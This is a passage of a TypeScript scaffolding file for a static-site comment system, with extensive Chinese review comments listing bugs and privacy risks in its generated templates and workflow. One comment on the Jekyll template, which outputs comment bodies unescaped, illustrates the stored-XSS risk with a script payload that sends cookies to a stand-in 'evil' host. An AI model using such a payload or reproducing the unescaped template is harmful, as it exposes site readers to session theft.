/**
 * ============================================================================
 * embed/src/cli/init.ts —— 给 SSG 生成"评论区模板 + 重建 workflow"
 * ============================================================================
 *
 * 【这个文件在整个系统里的位置】
 *
 *   它是【一次性脚手架】：`npx ziscus init`（或 deploy 的最后一步）调它，
 *   往你的站点仓库里写三个文件，之后就再也不参与运行了：
 *
 *     ┌─ ① ziscus.config.json ────────────────────────────────────────┐
 *     │  { endpoint, ssg, theme }                                     │
 *     │  之后所有 CLI 子命令都从这里读 endpoint（见 cli.ts 的 ⚠）       │
 *     └───────────────────────────────────────────────────────────────┘
 *     ┌─ ② 各 SSG 的模板文件 ─────────────────────────────────────────┐
 *     │  Hugo:     layouts/partials/ziscus.html                      │
 *     │  Astro:    src/components/Ziscus.astro                       │
 *     │  Eleventy: _includes/ziscus.njk                              │
 *     │  Jekyll:   _includes/ziscus.html                             │
 *     │  Next.js:  components/Ziscus.tsx                             │
 *     │  内容 = 主题 CSS + 评论列表 + 提交表单                          │
 *     └───────────────────────────────────────────────────────────────┘
 *     ┌─ ③ .github/workflows/rebuild-comments.yml ────────────────────┐
 *     │  收到 Worker 发的 repository_dispatch(rebuild-comments) 后      │
 *     │  重新构建站点，把新评论烘焙进 HTML，然后部署                     │
 *     └───────────────────────────────────────────────────────────────┘
 *
 *   ⚠ 【写文件用 writeFile，不是"存在则跳过"】第二次跑 init（或换 --theme 再跑）
 *     会【直接覆盖你手改过的模板和 workflow】，没有备份也没有提示。
 *     ★ 跑之前先 commit。
 *
 * ⚠⚠ 【本文件有三个互相独立、都很严重的问题，改代码前务必读完】
 *
 * ── 问题 1：这些模板用的是【另一套 class 名】，会让 Worker 的两个功能静默失效 ──
 *
 *   模板里产出的是 `.ziscus` / `.ziscus-comment` / `.ziscus-form`
 *   （和 styles/themes.ts 配套，见那里的「两套体系」说明）。
 *   而 worker 端的 HTMLRewriter 只认：
 *       #comments / #ziscus   （即时预览：替换评论列表）
 *       .comment-form …       （按页暂停：删掉表单输入框和按钮）
 *   ⚠ 结果：用 init 模板的站点，
 *     ① "评论者提交后立刻看到自己的评论" —— 不生效
 *     ② "npx ziscus pause <slug>" —— 不生效（表单不会被隐藏）
 *   两者都【没有任何报错】，页面看起来完全正常。
 *   ★ 修法：让模板直接内联 `ziscusStyles()` 并改用 `#comments` /
 *     `.comment-form`（同时也就让 README 的 Theming 说明生效了）。
 *
 * ── 问题 2：Hugo / Jekyll / Eleventy 的模板【开箱即坏】──
 *
 *   模板里的表单 action 依赖"站点配置里有 endpoint"，
 *   但 init 【不写这些站点配置】：
 *     · Hugo     `{{ .Site.Params.ziscus.endpoint }}` → 需要 hugo.toml 里有
 *                `[params.ziscus] endpoint = "…"`
 *                ⚠ 没配时 action 会渲染成 `/submit"` → 表单 POST 到站点自己
 *                  的 /submit → 404。访客填完提交，什么都不发生。
 *     · Jekyll   `{{ site.ziscus.endpoint }}` → 需要 _config.yml 里有
 *                `ziscus: { endpoint: … }`。⚠ 同上。
 *                ⚠ 另外它读 `site.data.comments[page.slug]`，
 *                  而 Jekyll 的数据目录是 `_data/`，`ziscus fetch` 的默认
 *                  输出目录是 `data/` —— 目录名不一致，取不到任何评论。
 *     · Eleventy 模板用 `comments[slug]` 和 `{{ endpoint }}` 两个全局变量，
 *                但 init 【既不给全局数据、也不在 workflow 里加
 *                `npx ziscus fetch`】—— 完全需要用户自己接线。
 *   · Astro / Next.js 走的是 `fetchComments()`，把 endpoint 作为组件 prop，
 *     ★ 这个设计是对的（数据在构建期直接拿到，不需要落盘）——
 *     但用户必须自己把 `endpoint` prop 传进去。
 *
 *   ⚠ 也就是说：五个 SSG 里有两个（Astro / Next.js）真正开箱可用，
 *     另外三个需要用户额外读源码才知道缺什么配置。
 *     init.test.ts 只断言了模板字符串里"包含"某些片段，
 *     【没有任何端到端验证】—— 所以这类问题测试是抓不到的。
 *
 * ── 问题 3：③ 的 workflow 会 `git add -A` 后 push，可能把敏感数据提交到公开仓库 ──
 *
 *   见 `generateWorkflow()` 的注释，那里有完整说明。简要版：
 *   `git add -A` 会把构建过程产生的任何文件都提交上去，
 *   包括 `npx ziscus export` 写出的评论备份 —— 而 export
 *   【默认不脱敏】，里面的 `ip_hash` 就是 IP 地址（无盐 SHA-256 前缀，
 *   IPv4 只有 2^32 种，可反查）。README 自己在 Key management 一节
 *   警告过这件事，但这个脚手架恰好把用户推到了那个坑边上。
 *
 * 【导出】只有 `runInit`。
 */
import { mkdir, writeFile } from "node:fs/promises";
import { join } from "node:path";
import { generateThemeCss, type ThemeColors } from "../styles/themes.js";

/**
 * `runInit` 的入参。
 *
 * ⚠ `ssg` 用联合类型把合法值钉住了，但 **`theme` 只是 string，没有校验** ——
 *   拼错（`"Dark"`、`"solarized"`）不会报错，会在 generateThemeCss 里
 *   静默回退到 light。见 styles/themes.ts 的同名 ⚠。
 * ★ 想修：把 theme 也改成 `keyof typeof THEMES | ThemeColors` 的联合类型，
 *   让编译器帮你挡住拼写错误。
 *
 * ⚠ `customColors` 目前【从 CLI 传不进来】—— cli.ts 的 init / deploy
 *   都只传 `theme: "light"` 或用户输入的字符串，从来不构造 ThemeColors。
 *   所以这条分支实际上是"只给程序化调用者准备的 API"，
 *   而 index.ts 又没导出这个模块…… 结果是【死路径】。
 *   ★ 要么在 CLI 加 `--color-text` 之类的选项，要么删掉这个参数。
 */
export interface InitOptions {
  endpoint: string;
  ssg: "hugo" | "astro" | "eleventy" | "jekyll" | "nextjs";
  theme: string;
  customColors?: ThemeColors;
  dir: string;
}

/**
 * 每个 SSG 的脚手架描述表。★ 加一个新 SSG 就加一条。
 *
 * 【各字段的作用】
 *   templatePath      写到哪个文件（相对于项目根）
 *   template          把主题 CSS 变成模板文本的工厂函数
 *   workflowBuild     生成的 workflow 里的构建步骤（含 SSG 自己的依赖设置）
 *   workflowPreBuild  构建【之前】要跑的步骤 —— 只有 Hugo/Jekyll 用它来
 *                     抓评论落盘（`npx ziscus fetch --all`）。
 *
 * ⚠ 【Eleventy 缺 workflowPreBuild，但它的模板需要 comments 数据】
 *   → 开箱即坏。详见文件头「问题 2」。
 *   ★ 修法：给 eleventy 也加 `npx ziscus fetch --output _data/comments --all`，
 *     并把模板里的 `comments[slug]` 改成 `comments[slug]`（Eleventy 会把
 *     `_data/comments/x.json` 变成 `comments.x` 全局变量；
 *     ⚠ 注意 Eleventy 是用【点号】而不是下标访问的，模板写法也要跟着改）。
 *
 * ⚠ 【Astro / Next.js 没有 workflowPreBuild 是正确的】它们的模板在构建时
 *   直接用 fetchComments() 发请求，不需要落盘。
 *   ⚠ 但这也意味着【构建机器必须能访问 Worker】—— 内网 CI 或
 *     Cloudflare 被墙的环境下会静默拿到空评论（fail-open，见 embed/src/fetch.ts）。
 *
 * ⚠ 【`workflowBuild` 里混用了 npm 和 npx，且假设了包管理器】
 *   Astro/Next 用 `npm install`，Hugo 用 hugo action，Jekyll 用 bundler。
 *   如果用户的项目是 pnpm（ziscus 自己的开发就用 pnpm），
 *   `npm install` 在带 pnpm-lock.yaml 的仓库里可能装出不同的依赖树。
 *   ★ 建议按 lockfile 检测包管理器，或至少用 `npm ci`（当有 package-lock.json 时）。
 */
const SSG_CONFIG: Record<string, {
  templatePath: string;
  template: (css: string) => string;
  workflowBuild: string;
  workflowPreBuild?: string;
}> = {
  hugo: {
    templatePath: "layouts/partials/ziscus.html",
    template: hugoPartial,
    workflowBuild: `      - uses: peaceiris/actions-hugo@v3
        with: { hugo-version: latest }
      - run: hugo --minify`,
    workflowPreBuild: "      - run: npx ziscus fetch --all",
  },
  astro: {
    templatePath: "src/components/Ziscus.astro",
    template: astroComponent,
    workflowBuild: `      - run: npm install
      - run: npx astro build`,
  },
  eleventy: {
    templatePath: "_includes/ziscus.njk",
    template: eleventyInclude,
    workflowBuild: "      - run: npx @11ty/eleventy",
  },
  jekyll: {
    templatePath: "_includes/ziscus.html",
    template: jekyllInclude,
    workflowBuild: `      - uses: ruby/setup-ruby@v1
        with: { ruby-version: '3.3' }
      - run: bundle install
      - run: bundle exec jekyll build`,
    workflowPreBuild: "      - run: npx ziscus fetch --all",
  },
  nextjs: {
    templatePath: "components/Ziscus.tsx",
    template: nextjsComponent,
    workflowBuild: `      - run: npm install
      - run: npx next build`,
  },
};

/**
 * 生成 SSG 模板和重建 workflow，写进 `dir`。
 *
 * 【输入输出契约】
 *   options.endpoint      Worker 地址，原样写进 ziscus.config.json
 *                         ⚠ 【不做任何校验】。它还会被塞进生成的模板里
 *                         （Hugo/Jekyll 走站点配置，不在这里），
 *                         所以填错了不会在这里报错，而是在构建期
 *                         表现为评论区静默为空。
 *   options.ssg           必须是 SSG_CONFIG 的键之一
 *   options.theme         主题名（未校验，见 InitOptions 的 ⚠）
 *   options.customColors  自定义配色（⚠ 目前 CLI 传不进来）
 *   options.dir           输出根目录。init 传 "."，deploy 也传 "."
 *   副作用                 写 3 个文件（可能覆盖已有的）；建目录
 *   返回                   void。⚠ 失败时抛异常（没有 try/catch）。
 *
 * ⚠ 【调用方必须自己确认 ssg 合法】`SSG_CONFIG[ssg]` 查不到就抛
 *   `Unknown SSG: …`。cli.ts 里是先做白名单校验再调用的，所以那条路安全；
 *   ★ 但如果以后有别的调用方（比如配置文件里读 ssg），别忘了先校验。
 *
 * ⚠ 【`theme` 与 `customColors` 的优先级是"customColors 优先"】，
 *   两者同时传时 theme 被忽略（见下面的三元表达式）。
 */
export async function runInit(options: InitOptions): Promise<void> {
  const { endpoint, ssg, theme, customColors, dir } = options;
  const config = SSG_CONFIG[ssg];
  if (!config) throw new Error(`Unknown SSG: ${ssg}`);

  // customColors 优先于 theme：允许程序化调用者完全接管配色。
  // ⚠ 从 CLI 走的话 customColors 永远是 undefined（见 InitOptions 的 ⚠）。
  const css = customColors
    ? generateThemeCss(customColors)
    : generateThemeCss(theme);

  // 1. Write config
  // ⚠ 这里【只写三个字段】。任何用户手加进 ziscus.config.json 的
  //   自定义字段（比如想记一下 worker 名字）都会在重跑 init 时被抹掉。
  // ⚠ 它同时也是所有 CLI 子命令读 endpoint 的唯一来源 ——
  //   所以这个文件被删/被改坏，几乎每个命令都会报
  //   "No --endpoint and no ziscus.config.json"。
  await writeFile(
    join(dir, "ziscus.config.json"),
    JSON.stringify({ endpoint, ssg, theme }, null, 2) + "\n",
  );

  // 2. Write template
  // 从 templatePath 推出目录： "layouts/partials/ziscus.html" → "layouts/partials"
  //                          "components/Ziscus.tsx"        → "components"
  // ⚠ 用字符串 split("/") 拼路径而不是 path.dirname() —— 在 Windows 上
  //   模板里的路径都是 "/" 分隔的，所以这里其实【必须】用 "/" 而不能用
  //   path.dirname()（后者在 Windows 上认 "\"）。★ 这个"反直觉但正确"的
  //   写法值得保留，别顺手改成 path API。
  const templateDir = join(dir, ...config.templatePath.split("/").slice(0, -1));
  await mkdir(templateDir, { recursive: true });
  await writeFile(join(dir, config.templatePath), config.template(css));

  // 3. Write workflow
  // ⚠ 文件名固定为 rebuild-comments.yml。如果你的仓库里已经有同名
  //   workflow，它会被【静默覆盖】。
  // ⚠ 无条件写：即使你的站点不打算用自动重建，也会多出这个文件。
  const workflowDir = join(dir, ".github", "workflows");
  await mkdir(workflowDir, { recursive: true });
  await writeFile(join(workflowDir, "rebuild-comments.yml"), generateWorkflow(config));
}

/**
 * 拼出 `.github/workflows/rebuild-comments.yml` 的内容。
 *
 * 【触发链路】
 *   Worker 在"评论被批准"时向 `GITHUB_REPO` 发一个
 *   `repository_dispatch`，`event_type` 是 `rebuild-comments`
 *   （对应下面 `on.repository_dispatch.types`）。
 *   ⚠ 这个字符串是【跨包契约】：改这里就必须同步改 Worker 侧
 *     （worker/src/admin-api.ts 的 handleRebuild / 触发逻辑），
 *     否则 dispatch 会发出但【没有任何 workflow 被触发】——
 *     表现为"批准评论后站点永远不更新"，而 GitHub 那边一切正常（204）。
 *
 * ⚠⚠ 【`git add -A` + `git push` 是这套脚手架里最危险的三行】
 *
 *   1. 它把【构建过程产生的所有文件】都提交并推送到仓库。
 *      如果用户的构建流程里有 `npx ziscus export`（README 的
 *      Key management 一节就是这么建议备份的），而没加 `--redact-ip`，
 *      那么 `backups/*.json` 里的 `ip_hash` 会被【公开提交】。
 *      ⚠ ip_hash 是 IP 的无盐 SHA-256 前缀，IPv4 空间只有 2^32，
 *      一张彩虹表就能反查出真实 IP —— **"发布了 ip_hash"等于"发布了 IP"**。
 *      理由在 cli/export.ts 的类型注释和 README 里都写过，
 *      但这个脚手架的 `git add -A` 恰好把用户推到了那个边界上。
 *      ★ 修法：改成显式的 `git add <构建产物目录>`（白名单），
 *        或者在 workflow 里加一条 `git check-ignore`/敏感文件名断言。
 *
 *   2. `permissions: contents: write` 让 workflow 能推送回仓库。
 *      ⚠ 如果你的默认分支开了 branch protection / required reviews，
 *      这个 push 会被拒绝 —— workflow 红，而"评论不更新"的原因
 *      在保护规则里，不在 ziscus 里。
 *
 *   3. ⚠ GitHub 有一条刻意的限制：**用默认 GITHUB_TOKEN 产生的 push
 *      不会再触发其它 workflow**（防止无限递归）。
 *      所以如果你的部署是"push 触发另一个 deploy workflow"，
 *      那条链路【不会跑】，站点不会被更新。
 *      这正是 ziscus 自己的站点【没有走 commit-back】的原因 ——
 *      README 明确写了它是"重新生成 → 上传脱敏备份 artifact →
 *      wrangler deploy，不提交回仓库"。
 *      ⚠ 也就是说：**脚手架生成的方案和维护者自己用的方案不一致**，
 *      而只有后者经过了真实流量的检验。
 *      ★ 如果你的托管商支持直接部署（Cloudflare Pages、Netlify、
 *        Vercel），建议把 scaffold 也改成"构建 + 部署"而不是
 *        "构建 + commit + push" —— 少一次 git 往返，也绕开上面两个坑。
 *
 * ⚠ 【没有 concurrency 组】短时间内连续批准多条评论会触发多次 dispatch
 *   （Worker 侧有 30 秒 debounce，见 README），但两次构建仍可能重叠，
 *   两个 job 同时 `git push` 时后一个会因为 non-fast-forward 失败。
 *   ★ 建议加：
 *       concurrency: { group: rebuild-comments, cancel-in-progress: false }
 *
 * ⚠ 【没有 schedule 兜底】README 的「Auto-rebuild」一节明确建议
 *   "加一个每日 schedule: 作为安全网 —— token 过期时最多延迟一天发布"，
 *   但这个生成的 workflow 【没有】这一段。也就是说脚手架没有落实
 *   自己文档里的建议。
 *   ★ 加上它是低成本高收益的（一行 cron）。
 *
 * ⚠ 【`git diff --cached --quiet && echo "No changes" && exit 0` 的技巧】
 *   在没有变更时提前成功退出，避免空 commit。这是对的写法。
 *   ⚠ 但注意 `exit 0` 会让整个 step 成功 —— 后面没有其它 step，
 *     所以等价于"job 成功、什么都没做"，符合预期。
 *
 * @param config 从 SSG_CONFIG 取出的条目（只用 workflowBuild / workflowPreBuild）
 * @returns 完整 YAML 文本
 */
function generateWorkflow(config: { workflowBuild: string; workflowPreBuild?: string }): string {
  const preBuild = config.workflowPreBuild ? `\n${config.workflowPreBuild}` : "";
  return `name: Rebuild comments
on:
  repository_dispatch:
    types: [rebuild-comments]
permissions:
  contents: write
jobs:
  rebuild:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: 22 }${preBuild}
${config.workflowBuild}
      - name: Commit and push
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "github-actions[bot]@users.noreply.github.com"
          git add -A
          git diff --cached --quiet && echo "No changes" && exit 0
          git commit -m "rebuild: bake fresh comments"
          git push
`;
}

/**
 * 生成 Hugo 的 `layouts/partials/ziscus.html`（Go template 语法）。
 *
 * 【数据从哪来】
 *   `index .Site.Data "comments" $slug` 等价于读 `data/comments/<slug>.json`，
 *   这正是 `npx ziscus fetch` 的默认输出目录 —— ✓ 两边对上了。
 *   数据由生成的 workflow 里的 `npx ziscus fetch --all` 步骤预先抓好。
 *
 * 【slug 怎么定 —— ⚠ 这是最容易出错的地方】
 *   优先 `.File.ContentBaseName | urlize`（即内容文件名），
 *   拿不到 `.File` 时退回 `.Page.Title | urlize`。
 *
 *   ⚠ 这个规则必须和 `npx ziscus fetch` 从 sitemap 抽 slug 的规则
 *     （取 URL 路径最后一段）逐字一致，否则：
 *       抓回来的文件叫 `a.json`，而页面表单里 slug 是 `b`
 *       → 页面上永远显示不出评论，而且【双方都不报错】。
 *   ⚠ `.File` 在首页、列表页、taxonomy 页上是 nil，会走 Title 分支 ——
 *     用【页面标题】当 slug（含空格、标点、可能非 ASCII），
 *     urlize 之后几乎不可能和 sitemap 末段一致。
 *     ★ 建议统一成"用 .Permalink 的路径部分"，并在所有 SSG 与 fetch 侧共用。
 *   ⚠ 另一个经典碰撞：`/2024/01/hello/index.md` 和 `/2025/06/hello/index.md`
 *     的 ContentBaseName 都是 `hello` —— 两篇文章共用一个评论区。
 *
 * ⚠⚠ 【`{{ .author }}` / `{{ .body }}` 会双重转义，用户看到实体字符】
 *   Go 的 html/template 【默认自动转义】。而数据源（`ziscus fetch` 写的 JSON）
 *   里存的已经是【已转义】文本。两次转义 → 页面显示 `&amp;lt;` 之类。
 *   完整分析见 `cli/fetch.ts` 文件头的「两条通路对转义的处理不一致」。
 *   ★ 如果按那里的建议 (a) 修（让 JSON 存纯文本），这个模板【不用改】就正确了
 *     —— 这也是推荐 (a) 的原因之一。
 *
 * ⚠ 【表单 action 依赖站点配置，但 init 不写这个配置】
 *   `{{ .Site.Params.ziscus.endpoint }}` 需要在 hugo.toml 里手写
 *   `[params.ziscus] endpoint = "https://…"`。没配时 action 会渲染成
 *   `/submit`（空串 + "/submit"）→ 表单 POST 到站点自己的 /submit → 404，
 *   访客填完提交后【什么都不发生】。详见文件头「问题 2」。
 *
 * ⚠ 【class 名不匹配 Worker 的选择器】
 *   这里用的是 `.ziscus` / `.ziscus-form`，而 Worker 的 HTMLRewriter 认的是
 *   `#comments` / `.comment-form`。所以即时预览和按页暂停都不生效。
 *   详见文件头「问题 1」。
 *
 * ⚠ 【CSS 内联在每个页面里】`<style>${css}</style>` 会被拼进每一页，
 *   同一个 ~1KB 的样式表在整站重复 N 次，且不参与浏览器缓存。
 *   ★ 建议写进 `assets/` 再用 Hugo Pipes 打包 —— 顺带获得指纹缓存。
 *
 * @param css 由 generateThemeCss() 生成的样式文本（⚠ 属于 `.ziscus` 体系）
 */
function hugoPartial(css: string): string {
  return `{{- $endpoint := .Site.Params.ziscus.endpoint -}}
{{- $slug := "" -}}
{{- with .File -}}
  {{- $slug = .ContentBaseName | urlize -}}
{{- else -}}
  {{- $slug = .Page.Title | urlize -}}
{{- end -}}
{{- $comments := index .Site.Data "comments" $slug | default (slice) -}}

<div class="ziscus">
  <style>${css}</style>

  {{ if $comments }}
  <h2>{{ len $comments }} Comment{{ if ne (len $comments) 1 }}s{{ end }}</h2>
  {{ range $comments }}
  <article class="ziscus-comment">
    <header class="ziscus-header">
      <strong class="ziscus-author">{{ .author }}</strong>
      <time class="ziscus-time" datetime="{{ .created_at }}">{{ dateFormat "January 2, 2006" .created_at }}</time>
    </header>
    <p class="ziscus-body">{{ .body }}</p>
  </article>
  {{ end }}
  {{ else }}
  <h2>Comments</h2>
  <p>No comments yet.</p>
  {{ end }}

  <form method="POST" action="{{ $endpoint }}/submit" class="ziscus-form">
    <input type="hidden" name="slug" value="{{ $slug }}">
    <div><label for="ziscus-author">Name</label>
    <input type="text" name="author" id="ziscus-author" required></div>
    <div><label for="ziscus-body">Comment</label>
    <textarea name="body" id="ziscus-body" rows="4" required></textarea></div>
    <button type="submit">Post Comment</button>
  </form>
</div>
`;
}

/**
 * 生成 Astro 的 `src/components/Ziscus.astro`（★ 这是质量最好的一个模板）。
 *
 * 【为什么它是对的】
 *   它在构建期直接 `await fetchComments(slug, endpoint)`，走的正是
 *   `embed/src/fetch.ts` 那条"库通路"：
 *     数据 = 已反转义的纯文本 → `{c.body}` 由 Astro 转义一次 → 正确显示。
 *   ✓ 不需要落盘 JSON，✓ 不需要 workflow 里的 fetch 步骤，
 *   ✓ 不存在 Hugo/Jekyll 那种双重转义问题。
 *   ★ 这应该是其它四个模板的参考实现。
 *
 * ⚠ 【它仍然重做了 render.ts 的过滤】`comments.filter(c => c.status === "approved")`
 *   —— 这里过滤一次，`renderCommentList()` 里还会再过滤一次。
 *   冗余但无害。★ 更彻底的做法是直接使用包导出的
 *   `renderCommentsSection()`，那样连 HTML 结构都不用自己维护，
 *   而且能自动拿到 worker 需要的 `#comments` / `.comment-form`（见下）。
 *
 * ⚠ 【同样没有 `id="comments"` / `.comment-form`】
 *   最外层是 `<div class="ziscus">`，表单是 `class="ziscus-form"`。
 *   所以 worker 的即时预览和按页暂停【都不生效】，见文件头「问题 1」。
 *   ⚠ 讽刺的是 worker 的 HTMLRewriter 恰好也认 `.on("#ziscus", …)` ——
 *     但那要求元素有 **id**="ziscus"，而这里是 **class**。差一个字符。
 *   ★ 把 `<div class="ziscus">` 改成 `<div id="ziscus">`，
 *     就能白拿到"即时预览"功能（按页暂停还需要 `.comment-form`）。
 *
 * ⚠ 【`endpoint` 是必填 prop，但组件不做任何校验】
 *   如果调用方忘了传（`<Ziscus slug={...} />`），TS 会报错 ✓，
 *   但在 `.astro` 里用的是 `interface Props` —— Astro 会做类型检查 ✓。
 *   传了空串则不会有任何提示，直接表现为评论区为空。
 *
 * ⚠ 【`<style is:inline>` 会把 CSS 内联进每个页面的 HTML】
 *   `is:inline` 是刻意加的（否则 Astro 会把样式抽成外部文件，
 *   而这里的 CSS 是运行时字符串，抽不出来）。
 *   代价是每页重复、不可缓存。★ 建议改成在布局里写一次 `<link>`，
 *   或把样式落到 `src/styles/ziscus.css`。
 *
 * @param css 由 generateThemeCss() 生成的样式文本（⚠ 属于 `.ziscus` 体系）
 */
function astroComponent(css: string): string {
  return `---
import { fetchComments } from "ziscus";

interface Props {
  slug: string;
  endpoint: string;
}

const { slug, endpoint } = Astro.props;
const comments = await fetchComments(slug, endpoint);
const approved = comments.filter(c => c.status === "approved");
---

<div class="ziscus">
  <style is:inline>
${css}
  </style>

  {approved.length > 0 ? (
    <>
      <h2>{approved.length} {approved.length === 1 ? "Comment" : "Comments"}</h2>
      {approved.map(c => (
        <article class="ziscus-comment">
          <header class="ziscus-header">
            <strong class="ziscus-author">{c.author}</strong>
            <time class="ziscus-time" datetime={c.createdAt}>
              {new Date(c.createdAt).toLocaleDateString("en-US", { year: "numeric", month: "long", day: "numeric", timeZone: "UTC" })}
            </time>
          </header>
          <p class="ziscus-body">{c.body}</p>
        </article>
      ))}
    </>
  ) : (
    <>
      <h2>Comments</h2>
      <p>No comments yet.</p>
    </>
  )}

  <form method="POST" action={\`\${endpoint}/submit\`} class="ziscus-form">
    <input type="hidden" name="slug" value={slug} />
    <div><label for="ziscus-author">Name</label>
    <input type="text" name="author" id="ziscus-author" required /></div>
    <div><label for="ziscus-body">Comment</label>
    <textarea name="body" id="ziscus-body" rows="4" required /></div>
    <button type="submit">Post Comment</button>
  </form>
</div>
`;
}

/**
 * 生成 Eleventy 的 `_includes/ziscus.njk`（Nunjucks 语法）。
 *
 * ⚠⚠ 【这个模板开箱即坏 —— 两个全局变量没有任何地方提供】
 *   · `comments`  —— 需要 Eleventy 的全局数据里有它。
 *     本模板按 `comments[slug]` 取值，也就是说数据要长成
 *     `{ "<slug>": [ … ] }` 的形状（一个把所有页面聚合起来的对象），
 *     而 **`ziscus fetch` 产出的是"每页一个 `<slug>.json` 文件"**，
 *     Eleventy 默认会把它变成 `comments.<slug>` 这样一个【按点号访问】的
 *     命名空间，而不是可以 `[slug]` 下标访问的对象。
 *     ⚠ 两者形状不同 —— 也就是说即使你自己加了 `--output _data/comments`，
 *       这个模板仍然取不到数据，还得再写一个 `.11tydata.js` 把文件
 *       聚合成一个对象，或者改模板用 `comments[slug]` 的等价点号写法。
 *   · `endpoint`  —— 需要用 `_data/endpoint.json` 或 `.eleventy.js` 里的
 *     全局数据提供。本模板直接写 `{{ endpoint }}/submit`，
 *     没提供时 action 会变成 `/submit` → 表单 POST 到自己 → 404。
 *
 *   ⚠ 而且 `SSG_CONFIG.eleventy` 【没有 workflowPreBuild】——
 *     生成的 workflow 根本不会调 `ziscus fetch`。
 *   合起来：选 Eleventy 的用户拿到一个"能构建、能渲染、但评论区永远为空、
 *   表单永远 404"的站点，而且从产物上完全看不出哪里错了。
 *   ★ 修法：加 workflowPreBuild，并提供一个把 per-slug JSON 聚合成
 *     单对象的 Eleventy 数据文件生成器，或者干脆改用
 *     `renderCommentsSection()` + `.11ty.js` 模板（Eleventy 支持 JS 模板，
 *     可以在里面 await fetchComments，绕开整个"数据文件"问题）。
 *
 * ⚠ 【Nunjucks 默认开启 autoescape】所以 `{{ c.body }}` 会转义一次。
 *   配上 JSON 里已转义的文本 → 双重转义（同 Hugo/Jekyll 的问题）。
 *   ⚠ 想关掉自动转义（`{% autoescape false %}`）是【危险】的，
 *     不要为了"修"双重转义而关它。
 *
 * ⚠ 【时间是原样输出的 ISO 字符串】`datetime="{{ c.created_at }}"` 和
 *   正文一样直接打印 `{{ c.created_at }}`，不像 Hugo/Jekyll 那样格式化。
 *   用户看到的是 `2025-06-01T12:34:56Z` 这种机器格式。
 *   ★ 修法：加一个 Eleventy filter（如 `readableDate`）并在这里用。
 *
 * ⚠ 【class 名不匹配 Worker 选择器】同其它模板，见文件头「问题 1」。
 *
 * @param css 由 generateThemeCss() 生成的样式文本（⚠ 属于 `.ziscus` 体系）
 */
function eleventyInclude(css: string): string {
  return `<div class="ziscus">
  <style>${css}</style>
  {% set slugComments = comments[slug] %}
  {% if slugComments and slugComments.length %}
  <h2>{{ slugComments.length }} Comment{{ "s" if slugComments.length != 1 }}</h2>
  {% for c in slugComments %}
  <article class="ziscus-comment">
    <header class="ziscus-header">
      <strong class="ziscus-author">{{ c.author }}</strong>
      <time class="ziscus-time" datetime="{{ c.created_at }}">{{ c.created_at }}</time>
    </header>
    <p class="ziscus-body">{{ c.body }}</p>
  </article>
  {% endfor %}
  {% else %}
  <h2>Comments</h2>
  <p>No comments yet.</p>
  {% endif %}

  <form method="POST" action="{{ endpoint }}/submit" class="ziscus-form">
    <input type="hidden" name="slug" value="{{ slug }}">
    <div><label for="ziscus-author">Name</label>
    <input type="text" name="author" id="ziscus-author" required></div>
    <div><label for="ziscus-body">Comment</label>
    <textarea name="body" id="ziscus-body" rows="4" required></textarea></div>
    <button type="submit">Post Comment</button>
  </form>
</div>
`;
}

/**
 * 生成 Jekyll 的 `_includes/ziscus.html`（Liquid 语法）。
 *
 * ⚠⚠⚠ 【这个模板藏着一个 XSS 隐患 —— 而且它目前是"被另一个 bug 意外保护着"】
 *
 *   Liquid **不做 HTML 自动转义**。`{{ c.body }}` 是【原样输出】的。
 *   这跟 Hugo（Go template 自动转义）、Eleventy（Nunjucks autoescape 默认开）、
 *   Astro/React（自动转义）【都不一样】。
 *
 *   现在它为什么没被利用：
 *     数据来自 `ziscus fetch` 写出的 JSON，里面的文本【已经 HTML 转义过】
 *     （见 cli/fetch.ts 文件头）。所以即使 Liquid 原样输出，
 *     浏览器拿到的也是 `&lt;script&gt;` 这种实体，不会执行。
 *     **安全性完全来自"上游数据是转义的"这个巧合，而不是模板本身。**
 *
 *   ⚠ 一旦按 `cli/fetch.ts` 注释里的建议 (a) 把 JSON 改成"纯文本"
 *     （那是对 Hugo/Eleventy 双重转义的推荐修法），
 *     这个模板会立刻变成【存储型 XSS】：评论者提交
 *     `<script>fetch('//evil/'+document.cookie)</script>`，
 *     一旦被批准，就会在所有读者的页面上执行。
 *
 *   ★ 所以：**改 cli/fetch.ts 的转义策略时，必须同时把
 *     `{{ c.author }}` / `{{ c.body }}` 改成 `{{ c.author | escape }}` /
 *     `{{ c.body | escape }}`。** 这两件事必须原子地一起做。
 *     本次注释工作【没有改任何代码】，所以隐患当前是潜伏状态。
 *
 * ⚠ 【数据目录对不上 —— 开箱即坏】
 *   模板读 `site.data.comments[page.slug]`，Jekyll 的数据目录是 **`_data/`**，
 *   而 `ziscus fetch` 的默认输出目录是 **`data/`**。
 *   ⚠ 而且 `SSG_CONFIG.jekyll` 的 workflowPreBuild 写的是
 *     `npx ziscus fetch --all`（没带 `--output`）——
 *     所以数据落在 `data/comments/`，Jekyll 去 `_data/comments/` 找，
 *     **永远取不到任何评论**，页面永远显示 "No comments yet."。
 *   ★ 修法：workflowPreBuild 改成
 *     `npx ziscus fetch --all --output _data/comments`。
 *
 * ⚠ 【表单 action 依赖 `_config.yml` 里的 `ziscus.endpoint`，init 不写它】
 *   `{{ site.ziscus.endpoint }}/submit` → 没配时渲染成 `/submit`
 *   → 表单 POST 到站点自己 → 404，访客提交后什么都不发生。
 *   同 Hugo，见文件头「问题 2」。
 *
 * ⚠ 【`page.slug` 不总是存在】Jekyll 的 `page.slug` 由文件名推导，
 *   很多主题/插件（如 jekyll-seo-tag 的 `page.slug`）会给它不同语义，
 *   自定义 permalink 配置下它也可能和 URL 末段不一致。
 *   ★ 更稳的是 `page.url`（在模板里用 `page.url | slugify`），
 *     但它和 `ziscus fetch` 的抽取规则同样要保持一致。
 *
 * ⚠ 【class 名不匹配 Worker 选择器】同上，见文件头「问题 1」。
 *
 * @param css 由 generateThemeCss() 生成的样式文本（⚠ 属于 `.ziscus` 体系）
 */
function jekyllInclude(css: string): string {
  return `<div class="ziscus">
  <style>${css}</style>
  {% assign slug_comments = site.data.comments[page.slug] %}
  {% if slug_comments.size > 0 %}
  <h2>{{ slug_comments.size }} Comment{% if slug_comments.size != 1 %}s{% endif %}</h2>
  {% for c in slug_comments %}
  <article class="ziscus-comment">
    <header class="ziscus-header">
      <strong class="ziscus-author">{{ c.author }}</strong>
      <time class="ziscus-time" datetime="{{ c.created_at }}">{{ c.created_at | date: "%B %-d, %Y" }}</time>
    </header>
    <p class="ziscus-body">{{ c.body }}</p>
  </article>
  {% endfor %}
  {% else %}
  <h2>Comments</h2>
